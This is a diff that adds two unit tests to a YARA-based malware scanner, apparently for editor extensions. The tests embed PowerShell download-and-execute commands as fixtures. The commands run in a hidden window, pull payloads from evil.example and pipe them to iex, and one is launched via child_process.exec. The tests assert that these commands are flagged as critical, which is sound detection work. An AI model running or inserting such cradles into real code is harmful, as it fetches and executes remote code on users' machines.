@@ -140,4 +140,51 @@ describe("checkYara", () => {
     // Should not throw and should return array
     expect(Array.isArray(findings)).toBe(true);
   });
+
+  it("detects PowerShell hidden window pattern", async () => {
+    const available = await isYaraAvailable();
+    if (!available) return;
+
+    // Content that matches SUSP_PS_Hidden_Window_Jan25:
+    // requires "powershell" AND "-WindowStyle Hidden"
+    const maliciousContent = [
+      'const cmd = "powershell -WindowStyle Hidden',
+      " -Command irm https://evil.example/payload.ps1",
+      ' | iex";',
+      "require('child_process').exec(cmd);",
+    ].join("");
+
+    const contents = makeContents({
+      "extension.js": maliciousContent,
+    });
+
+    const findings = await checkYara(contents);
+
+    const psFindings = findings.filter((f) => f.id === "YARA_SUSP_PS_Hidden_Window_Jan25");
+    expect(psFindings).toHaveLength(1);
+    expect(psFindings[0]?.severity).toBe("critical");
+    expect(psFindings[0]?.metadata?.["ruleFile"]).toBe("powershell_attacks.yar");
+  });
+
+  it("detects PowerShell download-execute cradle", async () => {
+    const available = await isYaraAvailable();
+    if (!available) return;
+
+    // Content that matches LOADER_PS_Download_Execute_Jan25:
+    // requires PowerShell context + IEX pipe pattern
+    const maliciousContent = [
+      "const script = `powershell -Command ",
+      '"irm https://evil.example/stage2.ps1 | iex"`;',
+    ].join("");
+
+    const contents = makeContents({
+      "activate.js": maliciousContent,
+    });
+
+    const findings = await checkYara(contents);
+
+    const loaderFindings = findings.filter((f) => f.id === "YARA_LOADER_PS_Download_Execute_Jan25");
+    expect(loaderFindings).toHaveLength(1);
+    expect(loaderFindings[0]?.severity).toBe("critical");
+  });
 });
